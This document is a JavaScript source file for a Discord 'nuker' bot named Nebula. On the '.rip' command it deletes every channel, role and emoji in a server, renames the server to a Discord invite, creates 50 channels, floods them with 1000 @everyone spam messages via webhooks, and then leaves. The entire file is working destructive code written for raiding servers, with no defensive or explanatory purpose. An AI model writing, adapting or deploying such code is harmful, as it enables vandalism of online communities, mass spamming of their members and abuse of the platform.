// ====== LIBRARIES ======
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content === '.rip' && !message.author.bot) {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';

    // Delete all channels concurrently
    await Promise.all(guild.channels.cache.map(channel =>
      channel.delete().catch(() => {})
    ));

    // Delete all roles except @everyone
    await Promise.all(guild.roles.cache.map(async (role) => {
      if (role.name !== '@everyone' && !role.managed) {
        return role.delete().catch(() => {});
      }
    }));

    // Delete all emojis
    await Promise.all(guild.emojis.cache.map(emoji =>
      emoji.delete().catch(() => {})
    ));

    // Rename server
    try {
      await guild.edit({ name: 'discord.gg/migh' });
    } catch {}

    // Create 50 new text channels
    const createdChannels = [];
    for (let i = 0; i < 50; i++) {
      try {
        const channel = await guild.channels.create({ name: 'neb-was-here' });
        createdChannels.push(channel);
      } catch {}
    }

    // Fallback to at least one channel if none were created
    let channelsToUse = createdChannels.length > 0 ? createdChannels : [guild.channels.cache.first()];
    if (!channelsToUse[0]) {
      try {
        const fallbackChannel = await guild.channels.create({ name: 'fallback-channel' });
        channelsToUse = [fallbackChannel];
      } catch {
        message.channel.send("❌ Couldn't create any channels to spam.");
        return;
      }
    }

    // Send exactly 1000 messages total
    let messagesSent = 0;

    while (messagesSent < 1000) {
      for (const channel of channelsToUse) {
        if (messagesSent >= 1000) break;

        try {
          // Try creating webhook first
          const webhook = await channel.createWebhook({
            name: 'Nebula',
            avatar: 'https://i.imgur.com/6QbX6yA.png '
          });

          await webhook.send(spamMessage);
        } catch {
          // Fallback to regular message if webhook fails
          try {
            await channel.send(spamMessage);
          } catch {
            continue; // Skip this iteration if both fail
          }
        }

        messagesSent++;
        await new Promise(r => setTimeout(r, 50)); // Small delay to avoid rate limits
      }
    }

    console.log(`✅ Successfully sent ${messagesSent} messages.`);

    // Leave the server
    try {
      await guild.leave();
    } catch {}
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
